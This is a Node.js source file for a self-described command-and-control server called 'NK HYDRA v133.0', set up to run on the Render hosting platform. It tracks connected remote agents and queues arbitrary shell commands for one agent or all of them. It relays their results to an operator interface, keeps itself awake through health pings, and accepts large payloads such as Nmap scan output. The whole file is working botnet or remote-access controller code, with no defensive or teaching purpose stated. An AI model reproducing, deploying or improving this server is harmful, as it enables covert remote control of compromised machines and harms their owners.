// TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
// NK HYDRA v133.0 [SINGULARITY STABLE - LARGE PAYLOAD SUPPORT]

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

// --- ANTI-CRASH HANDLERS ---
process.on('uncaughtException', (err) => {
    console.error('CRITICAL: Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('CRITICAL: Unhandled Rejection:', reason);
});

const app = express();
app.use(cors());

// Health Check Endpoint for Ping Services (Keep Render Awake)
app.get('/health', (req, res) => { res.status(200).send('OK'); });
app.get('/', (req, res) => { 
    res.json({ 
        status: 'online', 
        version: 'v133.0', 
        agents: agents.length,
        queue: commandQueue.length
    }); 
});

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingInterval: 25000, 
    pingTimeout: 60000,
    maxHttpBufferSize: 1e8, // 100MB Limit for Large Nmap Scans
    transports: ['polling', 'websocket'] 
});

let agents = []; 
const commandQueue = [];
let isProcessingQueue = false;

// --- QUEUE PROCESSOR ---
const processQueue = async () => {
    if (isProcessingQueue || commandQueue.length === 0) return;
    isProcessingQueue = true;

    while (commandQueue.length > 0) {
        const task = commandQueue.shift();
        if (task) {
            try {
                if (task.targetId === 'all') {
                    io.emit('exec_cmd', { cmd: task.cmd, id: task.id });
                } else {
                    const agent = agents.find(a => a.id === task.targetId);
                    if (agent && agent.socketId) {
                         io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd, id: task.id });
                    } else {
                        // Re-queue if agent temporarily offline (Robustness)
                        if (task.retries && task.retries > 5) {
                            console.log("Dropping cmd, agent offline: " + task.targetId);
                        } else {
                            task.retries = (task.retries || 0) + 1;
                            commandQueue.push(task); 
                        }
                    }
                }
            } catch (e) {
                console.error("Queue Exec Error:", e);
            }
        }
        await new Promise(r => setTimeout(r, 200)); 
    }
    isProcessingQueue = false;
};

io.on('connection', (socket) => {
    
    // --- HEARTBEAT HANDLER ---
    socket.on('heartbeat', (data) => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) agent.lastSeen = Date.now();
    });

    socket.on('identify', (data) => {
        try {
            if (data.type === 'ui') {
                socket.join('ui_room');
                socket.emit('agents_list', agents);
                return;
            }

            // Remove existing agent entry (Avoid duplicates)
            agents = agents.filter(a => a.id !== data.id);
            
            agents.push({ 
                ...data, 
                socketId: socket.id, 
                status: 'Online', 
                lastSeen: Date.now() 
            });
            
            io.to('ui_room').emit('agents_list', agents);
            console.log(`[+] Agent Online: ${data.id}`);
            
            // Check for pending commands for this specific agent ID
            processQueue(); 

        } catch (e) {
            console.error("Identify Error:", e);
        }
    });

    socket.on('exec_cmd', (data) => {
        try {
            const { targetId, cmd } = data;
            const id = Date.now().toString(); // Command ID
            commandQueue.push({ targetId, cmd, id });
            
            io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `Queued: ${cmd}` });
            processQueue();

        } catch (e) { console.error("Exec Error:", e); }
    });
    
    socket.on('agent_event', (data) => {
        try {
            io.to('ui_room').emit('agent_event', data);
        } catch (e) { console.error("Relay Error:", e); }
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            agent.status = 'Offline'; 
            io.to('ui_room').emit('agents_list', agents);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v133 LISTENING ON ${PORT}`));
